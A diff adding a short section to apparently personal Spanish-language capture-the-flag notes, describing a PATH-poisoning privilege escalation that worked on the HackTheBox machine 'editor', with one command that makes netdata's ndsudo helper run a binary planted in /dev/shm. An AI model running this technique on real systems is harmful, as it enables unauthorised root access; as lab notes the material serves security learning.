@@ -262,6 +262,17 @@ inyecta el PATH antes de que el binario cambie de UID. sto es una categoría rea
 
 > SUID PATH Injection
 
+## PATH envenenado al ejecutar un binario
+
+Esto funciono en editor.htb
+
+```
+PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+```
+
+Busco el binario nvme-list en /dev/shm primero.
+
+
 ## Recordar Java y Groovy
 
 No les gustan las shells dentro del mismo string no lo manejan bien como:
